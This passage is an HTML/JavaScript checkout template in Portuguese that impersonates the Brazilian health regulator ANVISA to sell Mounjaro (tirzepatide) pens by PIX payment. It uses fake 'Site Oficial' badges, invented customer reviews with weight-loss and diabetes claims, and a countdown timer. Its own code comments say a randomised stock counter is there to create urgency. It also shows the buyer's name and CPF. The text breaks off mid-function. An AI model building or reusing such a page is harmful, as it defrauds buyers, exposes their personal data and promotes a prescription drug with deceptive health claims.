<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Complete Sua Compra | ANVISA</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script type="text/javascript">
      (function(c,l,a,r,i,t,y){
          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
      })(window, document, "clarity", "script", "r5wwtraiai");
  </script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f8f9fa;
    }
    
    .main-title {
      font-size: 24px;
      font-weight: 700;
      color: #1351b4;
      margin-bottom: 8px;
    }
    
    .subtitle {
      font-size: 16px;
      color: #666666;
      margin-bottom: 24px;
    }
    
    .sticky-header {
      position: sticky;
      top: 0;
      background-color: white;
      z-index: 50;
      transition: box-shadow 0.3s ease;
    }
    
    .sticky-header.shadow {
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    
    .secure-badge {
      display: inline-flex;
      align-items: center;
      background-color: #f0f7ff;
      color: #1351b4;
      padding: 6px 12px;
      border-radius: 16px;
      font-size: 12px;
      font-weight: 600;
    }
    
    .secure-badge i {
      margin-right: 4px;
    }
    
    .payment-container {
      background-color: white;
      border-radius: 12px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
      overflow: hidden;
      max-width: 700px;
      margin: 0 auto;
    }
    
    .payment-header {
      background-color: #f0f7ff;
      padding: 20px;
      border-bottom: 1px solid #e0e7ff;
    }
    
    .payment-content {
      padding: 30px;
    }
    
    .btn {
      padding: 12px 20px;
      border-radius: 6px;
      font-weight: 600;
      font-size: 16px;
      transition: all 0.2s ease;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }
    
    .btn-primary {
      background-color: #1351b4;
      color: white;
      border: none;
    }
    
    .btn-primary:hover {
      background-color: #0c3d8a;
    }
    
    .btn i {
      margin-right: 8px;
    }
    
    .vlibras-icon {
      position: fixed;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      z-index: 1000;
    }
    
    .countdown-timer {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    
    .countdown-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 0 8px;
    }
    
    .countdown-value {
      width: 50px;
      height: 50px;
      background-color: #1351b4;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 24px;
      font-weight: 700;
    }
    
    .countdown-label {
      margin-top: 4px;
      font-size: 12px;
      color: #6b7280;
    }
    
    .pix-code-container {
      background-color: #f9fafb;
      border-radius: 8px;
      padding: 16px;
      margin: 20px 0;
      border: 1px solid #e5e7eb;
    }
    
    .pix-code-title {
      font-size: 16px;
      font-weight: 600;
      color: #1351b4;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
    }
    
    .pix-code-title i {
      margin-right: 8px;
      color: #1351b4;
    }
    
    .pix-code {
      background-color: white;
      border: 1px dashed #d1d5db;
      border-radius: 4px;
      padding: 12px;
      font-family: monospace;
      font-size: 14px;
      color: #4b5563;
      word-break: break-all;
      max-height: 100px;
      overflow-y: auto;
      margin-bottom: 16px;
    }
    
    .order-summary {
      margin-top: 24px;
      padding-top: 24px;
      border-top: 1px solid #e5e7eb;
    }
    
    .order-summary-title {
      font-size: 18px;
      font-weight: 600;
      color: #1351b4;
      margin-bottom: 16px;
    }
    
    .summary-item {
      display: flex;
      justify-content: space-between;
      margin-bottom: 8px;
    }
    
    .summary-label {
      font-size: 14px;
      color: #6b7280;
    }
    
    .summary-value {
      font-size: 14px;
      font-weight: 500;
      color: #4b5563;
    }
    
    .summary-total {
      display: flex;
      justify-content: space-between;
      margin-top: 12px;
      padding-top: 12px;
      border-top: 1px dashed #e5e7eb;
    }
    
    .total-label {
      font-size: 16px;
      font-weight: 600;
      color: #1f2937;
    }
    
    .total-value {
      font-size: 16px;
      font-weight: 700;
      color: #1351b4;
    }
    
    .instructions {
      margin-top: 24px;
      padding: 16px;
      background-color: #f0f7ff;
      border-radius: 8px;
      border-left: 4px solid #1351b4;
    }
    
    .instructions-title {
      font-size: 16px;
      font-weight: 600;
      color: #1351b4;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
    }
    
    .instructions-title i {
      margin-right: 8px;
      color: #1351b4;
    }
    
    .instructions-list {
      margin-left: 16px;
      margin-top: 8px;
    }
    
    .instructions-list li {
      font-size: 14px;
      color: #4b5563;
      margin-bottom: 6px;
      list-style-type: disc;
    }
    
    .qr-code-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 20px 0;
    }
    
    .qr-code-image {
      width: 220px;
      height: 220px;
      border: 1px solid #e5e7eb;
      border-radius: 8px;
      padding: 8px;
      background-color: white;
    }
    
    .status-badge {
      display: inline-flex;
      align-items: center;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 8px;
    }
    
    .status-pending {
      background-color: #fffbeb;
      color: #d97706;
    }
    
    .copy-btn {
      padding: 8px 16px;
      background-color: #f3f4f6;
      border: 1px solid #d1d5db;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      color: #4b5563;
      cursor: pointer;
      display: flex;
      align-items: center;
      transition: all 0.2s ease;
    }
    
    .copy-btn:hover {
      background-color: #e5e7eb;
    }
    
    .copy-btn i {
      margin-right: 6px;
    }
    
    .stock-alert {
      margin: 16px 0;
      background-color: #fffbeb;
      border: 1px solid #fef3c7;
      border-radius: 8px;
      padding: 16px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
    }
    
    .stock-warning {
      display: flex;
      align-items: flex-start;
      background-color: #fef2f2;
      border-left: 4px solid #ef4444;
      padding: 12px;
      border-radius: 0 4px 4px 0;
    }
    
    .stock-warning i {
      color: #ef4444;
      font-size: 20px;
      margin-right: 12px;
      flex-shrink: 0;
      margin-top: 2px;
    }
    
    .warning-title {
      font-weight: 600;
      color: #ef4444;
      margin-bottom: 4px;
      font-size: 16px;
    }
    
    .warning-text {
      color: #1f2937;
      font-size: 14px;
      line-height: 1.4;
    }
  </style>
</head>
<body>
  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
  <div class="sticky-header">
    <div class="container mx-auto px-4 border-b border-[#0000001a]">
      <div class="flex items-center justify-between py-2">
        <div class="flex items-center">
          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
            Centro de Verificação Digital | ANVISA
          </p>
        </div>
        <div class="flex items-center space-x-4">
          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
        </div>
      </div>
    </div>
  </div>
  
  <div class="container mx-auto px-4">
    <div class="py-4">
      <div class="flex items-center space-x-2 text-[13px]">
        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
        <span class="text-[#9E9D9D]">></span>
        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
        <span class="text-[#9E9D9D]">></span>
        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
        <span class="text-[#9E9D9D]">></span>
        <span class="font-bold">Finalizar Pagamento PIX</span>
      </div>
    </div>
  </div>

  <main class="max-w-3xl mx-auto px-4 py-6">
    <div class="mb-6">
      <h2 class="main-title">
        Não perca sua chance de adquirir o Mounjaro!
      </h2>
      <p class="subtitle">
        Complete seu pagamento via PIX agora para garantir seu tratamento.
      </p>
    </div>
    
    <div class="flex flex-wrap justify-center gap-3 my-4">
      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
      <span class="secure-badge"><i class="fas fa-database"></i> Dados Protegidos</span>
    </div>
    
    <div class="stock-alert">
      <div class="stock-warning">
        <i class="fas fa-exclamation-triangle"></i>
        <div>
          <p class="warning-title">Estoque extremamente limitado!</p>
          <p class="warning-text">Restam apenas <span id="remaining-stock">85</span> unidades de Mounjaro. Finalize seu pagamento agora para garantir sua compra antes que o estoque acabe!</p>
        </div>
      </div>
    </div>
    
    <!-- Seção de Reviews/Avaliações -->
    <div class="bg-white rounded-lg shadow-lg p-6 mb-6">
      <h3 class="text-xl font-semibold text-[#0c326f] mb-4">Avaliações de Clientes Satisfeitos</h3>
      
      <div class="space-y-4" id="reviews-container">
        {% if reviews %}
          {% for review in reviews %}
            <div class="border-b border-gray-200 pb-4 last:border-b-0">
              <div class="flex items-center mb-2">
                <div class="bg-blue-100 text-blue-800 rounded-full w-10 h-10 flex items-center justify-center font-bold mr-3">
                  {{ review.customer_name[0]|upper if review.customer_name else 'C' }}
                </div>
                <div>
                  <p class="font-semibold text-gray-800">{{ review.customer_name or 'Cliente Verificado' }}</p>
                  <p class="text-xs text-gray-500">Compra verificada {{ review.created_at.strftime('%d/%m/%Y') if review.created_at else 'recentemente' }}</p>
                </div>
              </div>
              <div class="flex text-yellow-400 mb-2">
                <i class="fas fa-star"></i>
                <i class="fas fa-star"></i>
                <i class="fas fa-star"></i>
                <i class="fas fa-star"></i>
                <i class="fas fa-star"></i>
              </div>
              <p class="text-gray-700">"Excelente produto. Consegui resultados incríveis com Mounjaro. Recomendo muito!"</p>
            </div>
          {% endfor %}
        {% else %}
          <!-- Reviews visíveis inicialmente -->
          <div class="border-b border-gray-200 pb-4 review-item">
            <div class="flex items-center mb-2">
              <img src="/static/images/profile/mulher1.jpeg" alt="Maria Silva" class="w-10 h-10 rounded-full object-cover mr-3">
              <div>
                <p class="font-semibold text-gray-800">Maria Silva</p>
                <p class="text-xs text-gray-500">Compra verificada 15/04/2025</p>
              </div>
            </div>
            <div class="flex text-yellow-400 mb-2">
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
            </div>
            <p class="text-gray-700">"Excelente produto! Perdi 7kg em apenas 1 mês usando Mounjaro. Recomendo muito para quem luta contra o peso há anos como eu."</p>
          </div>
          
          <div class="border-b border-gray-200 pb-4 review-item">
            <div class="flex items-center mb-2">
              <img src="/static/images/profile/homem1.jpeg" alt="João Oliveira" class="w-10 h-10 rounded-full object-cover mr-3">
              <div>
                <p class="font-semibold text-gray-800">João Oliveira</p>
                <p class="text-xs text-gray-500">Compra verificada 10/04/2025</p>
              </div>
            </div>
            <div class="flex text-yellow-400 mb-2">
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star-half-alt"></i>
            </div>
            <p class="text-gray-700">"Superou minhas expectativas! Além da perda de peso, notei melhora na minha resistência à insulina. O produto chegou super bem embalado e refrigerado como prometido."</p>
          </div>
          
          <div class="border-b border-gray-200 pb-4 review-item">
            <div class="flex items-center mb-2">
              <img src="/static/images/profile/mulher2.jpeg" alt="Ana Carolina" class="w-10 h-10 rounded-full object-cover mr-3">
              <div>
                <p class="font-semibold text-gray-800">Ana Carolina</p>
                <p class="text-xs text-gray-500">Compra verificada 05/04/2025</p>
              </div>
            </div>
            <div class="flex text-yellow-400 mb-2">
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
            </div>
            <p class="text-gray-700">"Finalmente algo que funciona! Estou no meu segundo mês e já perdi 12kg. Entrega rápida e produto original. O sistema de refrigeração da embalagem manteve tudo na temperatura ideal."</p>
          </div>
          
          <!-- Reviews ocultas (mostradas ao clicar no botão "Ver mais") -->
          <div class="border-b border-gray-200 pb-4 review-item hidden">
            <div class="flex items-center mb-2">
              <img src="/static/images/profile/homem2.jpeg" alt="Roberto Mendes" class="w-10 h-10 rounded-full object-cover mr-3">
              <div>
                <p class="font-semibold text-gray-800">Roberto Mendes</p>
                <p class="text-xs text-gray-500">Compra verificada 01/04/2025</p>
              </div>
            </div>
            <div class="flex text-yellow-400 mb-2">
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
            </div>
            <p class="text-gray-700">"A entrega foi super rápida! Recebi em apenas 2 dias e o produto veio numa caixa térmica com gelo, mantendo tudo na temperatura ideal. Já comecei a usar e estou sentindo menos fome desde o primeiro dia."</p>
          </div>
          
          <div class="border-b border-gray-200 pb-4 review-item hidden">
            <div class="flex items-center mb-2">
              <img src="/static/images/profile/mulher3.jpeg" alt="Carla Pereira" class="w-10 h-10 rounded-full object-cover mr-3">
              <div>
                <p class="font-semibold text-gray-800">Carla Pereira</p>
                <p class="text-xs text-gray-500">Compra verificada 28/03/2025</p>
              </div>
            </div>
            <div class="flex text-yellow-400 mb-2">
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
            </div>
            <p class="text-gray-700">"Minha médica recomendou e depois de pesquisar muito decidi comprar. Chegou tudo certinho, produto original, na embalagem refrigerada como prometido. Já perdi 4kg na primeira semana! Não tive nenhum efeito colateral significativo."</p>
          </div>
          
          <div class="border-b border-gray-200 pb-4 review-item hidden">
            <div class="flex items-center mb-2">
              <img src="/static/images/profile/homem3.jpeg" alt="Lucas Ferreira" class="w-10 h-10 rounded-full object-cover mr-3">
              <div>
                <p class="font-semibold text-gray-800">Lucas Ferreira</p>
                <p class="text-xs text-gray-500">Compra verificada 20/03/2025</p>
              </div>
            </div>
            <div class="flex text-yellow-400 mb-2">
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
            </div>
            <p class="text-gray-700">"Impressionado com a qualidade e eficácia! O produto veio em uma embalagem especial refrigerada, com instruções detalhadas de uso. Fiquei com receio no início, mas o suporte pós-venda foi excelente e me ajudou com todas as dúvidas. Já indiquei para amigos."</p>
          </div>
          
          <div class="border-b border-gray-200 pb-4 review-item hidden">
            <div class="flex items-center mb-2">
              <img src="/static/images/profile/mulher4.jpeg" alt="Patricia Almeida" class="w-10 h-10 rounded-full object-cover mr-3">
              <div>
                <p class="font-semibold text-gray-800">Patricia Almeida</p>
                <p class="text-xs text-gray-500">Compra verificada 15/03/2025</p>
              </div>
            </div>
            <div class="flex text-yellow-400 mb-2">
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star"></i>
              <i class="fas fa-star-half-alt"></i>
            </div>
            <p class="text-gray-700">"Depois de tentar várias dietas sem sucesso, o Mounjaro foi uma luz no fim do túnel. Entrega impecável, veio tudo refrigerado e bem protegido. Já perdi 9kg em 45 dias e minha diabetes tipo 2 melhorou significativamente. Meu médico ficou impressionado com meus exames!"</p>
          </div>
        {% endif %}
      </div>
      
      <!-- Botão de Ver Mais Reviews -->
      <div class="text-center mt-6">
        <button id="load-more-reviews" class="px-4 py-2 bg-[#1351b4] text-white rounded-md hover:bg-[#0c3d8a] transition duration-200 flex items-center mx-auto">
          <i class="fas fa-comment-dots mr-2"></i> Ver mais avaliações
        </button>
      </div>
    </div>
    
    <div class="payment-container">
      <div class="payment-header">
        <h3 class="text-lg font-semibold text-[#0c326f]">Mounjaro - Tirzepatida 5mg</h3>
        <div class="flex items-center mt-2">
          <div class="status-badge status-pending">
            <i class="fas fa-clock mr-2"></i> Aguardando Pagamento
          </div>
        </div>
      </div>
      
      <div class="payment-content">
        <div class="text-center mb-4">
          <p class="text-gray-700 mb-2">Este QR Code expira em:</p>
          <div class="countdown-timer" id="countdown">
            <div class="countdown-item">
              <div class="countdown-value" id="minutes">30</div>
              <div class="countdown-label">minutos</div>
            </div>
            <div class="countdown-item">
              <div class="countdown-value" id="seconds">00</div>
              <div class="countdown-label">segundos</div>
            </div>
          </div>
        </div>
        
        <div class="qr-code-container">
          <img id="pixQrCode" src="{{ qr_code_url }}" alt="QR Code PIX" class="qr-code-image">
          <p class="text-sm text-gray-500 mt-2">Escaneie com o app do seu banco</p>
        </div>
        
        <div class="pix-code-container">
          <h4 class="pix-code-title">
            <i class="fas fa-copy"></i> Código PIX
          </h4>
          <div class="pix-code" id="pixCode">{{ pix_code }}</div>
          <button id="copyButton" class="copy-btn">
            <i class="fas fa-copy"></i> Copiar código PIX
          </button>
        </div>
        
        <div class="instructions">
          <h4 class="instructions-title">
            <i class="fas fa-info-circle"></i> Como pagar com PIX
          </h4>
          <p class="text-sm text-gray-600">Você pode pagar de duas formas:</p>
          <ul class="instructions-list">
            <li>Abra o aplicativo do seu banco, escolha a opção PIX e escaneie o QR Code acima.</li>
            <li>Ou copie o código PIX, abra o aplicativo do seu banco, escolha a opção PIX > Copia e Cola e cole o código.</li>
            <li>Confirme as informações e finalize o pagamento.</li>
            <li>Após o pagamento, você será redirecionado automaticamente para a página de confirmação.</li>
          </ul>
        </div>
        
        <div class="order-summary">
          <h3 class="order-summary-title">Resumo do Pedido</h3>
          
          <div class="summary-item">
            <div class="summary-label">Cliente:</div>
            <div class="summary-value" id="clientName">Carregando...</div>
          </div>
          
          <div class="summary-item">
            <div class="summary-label">CPF:</div>
            <div class="summary-value" id="clientCpf">Carregando...</div>
          </div>
          
          <div class="summary-item">
            <div class="summary-label">Produto:</div>
            <div class="summary-value">Mounjaro (Tirzepatida) 5mg</div>
          </div>
          
          <div class="summary-item">
            <div class="summary-label">Quantidade:</div>
            <div class="summary-value">Ciclo de 3 meses – 4 canetas</div>
          </div>
          
          <div class="summary-item">
            <div class="summary-label">Frete:</div>
            <div class="summary-value">Grátis</div>
          </div>
          
          <div class="summary-total">
            <div class="total-label">Total:</div>
            <div class="total-value" id="totalAmount">R$ 197,90</div>
          </div>
        </div>
        
        <div class="mt-6 text-center">
          <a href="#" id="checkStatusButton" class="btn btn-primary">
            <i class="fas fa-sync-alt"></i> Verificar Status do Pagamento
          </a>
        </div>
      </div>
    </div>
  </main>
  
  <div class="w-full mt-6">
    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
  </div>
  
  <a href="#" class="vlibras-icon">
    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
  </a>
  
  <script>
    // Configurar o botão "Ver mais avaliações"
    document.addEventListener('DOMContentLoaded', function() {
      const loadMoreBtn = document.getElementById('load-more-reviews');
      const hiddenReviews = document.querySelectorAll('.review-item.hidden');
      
      if (loadMoreBtn) {
        loadMoreBtn.addEventListener('click', function() {
          // Mostrar as reviews ocultas
          hiddenReviews.forEach(function(review) {
            review.classList.remove('hidden');
          });
          
          // Esconder o botão "Ver mais" após clicar
          loadMoreBtn.style.display = 'none';
          
          // Scroll suave para a primeira nova review
          if (hiddenReviews.length > 0) {
            hiddenReviews[0].scrollIntoView({ behavior: 'smooth', block: 'center' });
          }
        });
      }
    });
    
    // Gerar valor aleatório de estoque entre 43 e 85 unidades
    function gerarEstoqueAleatorio() {
      // Gerar um número aleatório entre 43 e 85
      const estoqueMinimo = 43;
      const estoqueMaximo = 85;
      return Math.floor(Math.random() * (estoqueMaximo - estoqueMinimo + 1)) + estoqueMinimo;
    }
    
    // Atualizar o valor do estoque na página
    function atualizarEstoque() {
      const estoqueElement = document.getElementById('remaining-stock');
      if (estoqueElement) {
        estoqueElement.textContent = gerarEstoqueAleatorio();
      }
    }
    
    // Executar atualização de estoque ao carregar a página
    document.addEventListener('DOMContentLoaded', function() {
      atualizarEstoque();
      
      // Atualizar o estoque aleatoriamente a cada 10-15 segundos para criar sensação de urgência
      setInterval(function() {
        atualizarEstoque();
      }, Math.random() * 5000 + 10000); // Entre 10 e 15 segundos
    });
    
    // Obter dados do PIX do localStorage
    function getPixData() {
      const pixDataStr = localStorage.getItem('pix_data');
      
      if (!pixDataStr) {
        return { transaction_id: null, pix_code: null, pix_qrcode: null, amount: null };
      }
      
      try {
        return JSON.parse(pixDataStr);
      } catch (e) {
        console.error("Erro ao processar dados do PIX:", e);
        return { transaction_id: null, pix_code: null, pix_qrcode: null, amount: null };
      }
    }
    
    // Função que será definida em detalhes mais abaixo
    
    // Inicializar dados da página
    function initializePageData() {
      // Obter o ID da transação da URL
      const urlParams = new URLSearchParams(window.location.search);
      const transactionIdFromUrl = window.location.pathname.split('/').pop();
      
      // Obter dados do PIX do localStorage
      const { transaction_id, pix_code, pix_qrcode, amount } = getPixData();
      
      // Se não houver dados suficientes no localStorage, usar os dados da URL
      if (!transaction_id || !pix_code || !pix_qrcode) {
        console.warn("Dados insuficientes no localStorage, tentando obter do servidor para transação: " + transactionIdFromUrl);
        
        // Verificar status do pagamento para obter dados do cliente via API
        fetch(`/verificar_pagamento_mounjaro?transaction_id=${transactionIdFromUrl}`)
          .then(response => response.json())
          .then(data => {
            console.log("Dados obtidos do servidor:", data);
            
            // Atualizar os dados na página
            updateClientData(data);
          })
          .catch(error => {
            console.error("Erro ao obter dados do servidor:", error);
          });
        
        return;
      }
      
      // Definir código PIX
      document.getElementById('pixCode').textContent = pix_code;
      
      // Definir QR code
      document.getElementById('pixQrCode').src = pix_qrcode;
      
      // Definir valor total se disponível
      if (amount) {
        document.getElementById('totalAmount').textContent = `R$ ${parseFloat(amount).toFixed(2).replace('.', ',')}`;
      }
      
      // Obter e exibir dados do cliente do localStorage
      const nomeCompleto = localStorage.getItem('nomeCompleto') || '';
      const cpfValidado = localStorage.getItem('cpfValidado') || '';
      
      // Formatar CPF para exibição
      const cpfFormatado = formatCPF(cpfValidado);
      
      // Atualizar os elementos na página
      document.getElementById('clientName').textContent = nomeCompleto || 'Cliente Anvisa';
      document.getElementById('clientCpf').textContent = cpfFormatado || 'CPF não disponível';
      
      // Função para formatar CPF (XXX.XXX. Font Awesome
      function formatCPF(cpf) {
        if (!cpf) return '';
        
        // Remover caracteres não numéricos
        cpf = cpf.replace(/\D/g, '');
        
        // Verificar se o CPF tem 11 dígitos
        if (cpf.length !== 11) return cpf;
        
        // Formatar no padrão XXX.XXX.XXX-XX
        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
      }
      
      // Configurar botão de verificação de status
      document.getElementById('checkStatusButton').addEventListener('click', function(e) {
        e.preventDefault();
        checkPaymentStatus(transaction_id);
      });
      
      // Configurar botão de cópia
      document.getElementById('copyButton').addEventListener('click', function() {
        copyToClipboard(pix_code);
      });
      
      // Iniciar countdown
      startCountdown(30 * 60); // 30 minutos em segundos
      
      // Checar status automaticamente a cada 10 segundos
      setInterval(function() {
        checkPaymentStatus(transaction_id, true);
      }, 10000);
    }
    
    // Copiar texto para a área de transferência
    function copyToClipboard(text) {
      const textarea = document.createElement('textarea');
      textarea.value = text;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      
      const button = document.getElementById('copyButton');
      const originalText = button.innerHTML;
      button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
      button.style.backgroundColor = '#dcfce7';
      button.style.borderColor = '#86efac';
      button.style.color = '#16a34a';
      
      setTimeout(function() {
        button.innerHTML = originalText;
        button.style.backgroundColor = '';
        button.style.borderColor = '';
        button.style.color = '';
      }, 2000);
    }
    
    // Atualizar dados do cliente na interface com dados vindos da API
    function updateClientData(data) {
      console.log("Atualizando dados do cliente:", data);
      
      // Extrair dados do cliente com fallbacks para diferentes nomes de campos
      const customerName = data.customer_name || data.name || data.nome || '';
      const customerCpf = data.customer_document || data.cpf || data.document || '';
      const customerPhone = data.customer_phone || data.phone || data.telefone || '';
      const customerEmail = data.customer_email || data.email || '';
      const pixCode = data.pix_code || data.copy_paste || data.pixCode || '';
      const qrCodeUrl = data.pix_qr_code || data.qr_code || data.pixQrCode || '';
      const amount = data.amount || data.valor || 197.90;
      const transactionId = data.transaction_id || data.id || window.location.pathname.split('/').pop();
      
      // Salvar dados no localStorage para uso posterior
      localStorage.setItem('clientData', JSON.stringify({
        name: customerName,
        cpf: customerCpf,
        phone: customerPhone,
        email: customerEmail,
        transaction_id: transactionId,
        amount: amount
      }));
      
      // Aplicar formatações necessárias nos dados
      const formattedCpf = formatCPF(customerCpf);
      
      // Atualizar elementos na página
      if (document.getElementById('clientName')) {
        document.getElementById('clientName').textContent = customerName || 'Cliente Anvisa';
      }
      
      if (document.getElementById('clientCpf')) {
        document.getElementById('clientCpf').textContent = formattedCpf || 'CPF não disponível';
      }
      
      if (document.getElementById('pixCode') && pixCode) {
        document.getElementById('pixCode').textContent = pixCode;
      }
      
      if (document.getElementById('pixQrCode') && qrCodeUrl) {
        document.getElementById('pixQrCode').src = qrCodeUrl;
      }
      
      if (document.getElementById('totalAmount')) {
        document.getElementById('totalAmount').textContent = `R$ ${parseFloat(amount).toFixed(2).replace('.', ',')}`;
      }
      
      // Salvar os dados no localStorage para uso futuro
      try {
        const userData = {
          nomeCompleto: customerName,
          cpfValidado: customerCpf,
          transaction_id: transactionId
        };
        
        if (customerName) localStorage.setItem('nomeCompleto', customerName);
        if (customerCpf) localStorage.setItem('cpfValidado', customerCpf);
        
        // Salvar dados do PIX, se disponíveis
        if (pixCode && qrCodeUrl) {
          const pixData = {
            transaction_id: transactionId,
            pix_code: pixCode,
            pix_qrcode: qrCodeUrl,
            amount: amount
          };
          localStorage.setItem('pix_data', JSON.stringify(pixData));
        }
      } catch (e) {
        console.error("Erro ao salvar dados no localStorage:", e);
      }
      
      // Configurar contador
      startCountdown(30 * 60); // 30 minutos em segundos
      
      // Configurar verificação automática de status
      if (transactionId) {
        // Configurar botão de verificação de status
        const checkStatusBtn = document.getElementById('checkStatusButton');
        if (checkStatusBtn) {
          // Remover handlers antigos para evitar duplicações
          const newBtn = checkStatusBtn.cloneNode(true);
          checkStatusBtn.parentNode.replaceChild(newBtn, checkStatusBtn);
          
          // Adicionar novo handler
          newBtn.addEventListener('click', function(e) {
            e.preventDefault();
            checkPaymentStatus(transactionId);
          });
        }
        
        // Limpar intervalos existentes
        if (window.statusCheckInterval) {
          clearInterval(window.statusCheckInterval);
        }
        
        // Checar status automaticamente a cada 10 segundos
        window.statusCheckInterval = setInterval(function() {
          checkPaymentStatus(transactionId, true);
        }, 10000);
      }
      
      // Configurar botão de cópia
      if (pixCode) {
        const copyBtn = document.getElementById('copyButton');
        if (copyBtn) {
          // Remover handlers antigos
          const newCopyBtn = copyBtn.cloneNode(true);
          copyBtn.parentNode.replaceChild(newCopyBtn, copyBtn);
          
          // Adicionar novo handler
          newCopyBtn.addEventListener('click', function() {
            copyToClipboard(pixCode);
          });
        }
      }
    }
    
    // Iniciar contagem regressiva
    function startCountdown(duration) {
      let timer = duration;
      const minutesDisplay = document.getElementById('minutes');
      const secondsDisplay = document.getElementById('seconds');
      
      const countdown = setInterval(function() {
        const minutes = Math.floor(timer / 60);
        const seconds = timer % 60;
        
        minutesDisplay.textContent = minutes.toString().padStart(2, '0');
        secondsDisplay.textContent = seconds.toString().padStart(2, '0');
        
        if (--timer < 0) {
          clearInterval(countdown);
          alert('O tempo para pagamento expirou. A página será recarregada.');
          window.location.reload();
        }
      }, 1000);
    }
    
    // Verificar status do pagamento
    function checkPaymentStatus(transaction_id, isAutoCheck = false) {
      // Atualizar UI para mostrar que estamos verificando
      const statusButton = document.getElementById('checkStatusButton');
      if (statusButton && !isAutoCheck) {
        // Salvar texto original
        const originalText = statusButton.innerHTML;
        // Mudar para indicar carregamento
        statusButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
        statusButton.disabled = true;
        
        // Restaurar depois de 3 segundos, independente do resultado
        setTimeout(() => {
          statusButton.innerHTML = originalText;
          statusButton.disabled = false;
        }, 3000);
      }
      
      fetch(`/verificar_pagamento_mounjaro?transaction_id=${transaction_id}`)
        .then(response => response.json())
        .then(data => {
          console.log("Verificação de status:", data);
          
          // Mostrar status na interface
          const statusBadge = document.querySelector('.status-pending');
          if (statusBadge) {
            if (data.status === 'paid' || data.status === 'completed') {
              statusBadge.innerHTML = '<i class="fas fa-check-circle mr-2"></i> Pagamento Confirmado';
              statusBadge.classList.remove('status-pending');
              statusBadge.classList.add('bg-green-100', 'text-green-800');
            } else if (data.status === 'cancelled' || data.status === 'failed') {
              statusBadge.innerHTML = '<i class="fas fa-times-circle mr-2"></i> Pagamento Cancelado';
              statusBadge.classList.remove('status-pending');
              statusBadge.classList.add('bg-red-100', 'text-red-800');
            } else {
              statusBadge.innerHTML = '<i class="fas fa-clock mr-2"></i> Aguardando Pagamento';
            }
          }
          
          // Atualizar dados na interface, mesmo se o pagamento ainda não estiver confirmado
          if (!isAutoCheck) {
            updateClientData(data);
          }
          
          if (data.status === 'paid' || data.status === 'confirmed' || data.status === 'completed') {
            // Função para capturar todos os parâmetros da URL atual
            function getAllUrlParams() {
              let urlParams = {};
              const queryString = window.location.search;
              if (queryString) {
                const urlSearchParams = new URLSearchParams(queryString);
                urlSearchParams.forEach((value, key) => {
                  urlParams[key] = value;
                });
              }
              return urlParams;
            }
            
            // Função para preservar parâmetros da URL entre as páginas
            function appendUrlParams(baseUrl, additionalParams = {}) {
              const urlParams = {...getAllUrlParams(), ...additionalParams};
              
              const urlSearchParams = new URLSearchParams();
              for (const key in urlParams) {
                urlSearchParams.append(key, urlParams[key]);
              }
              
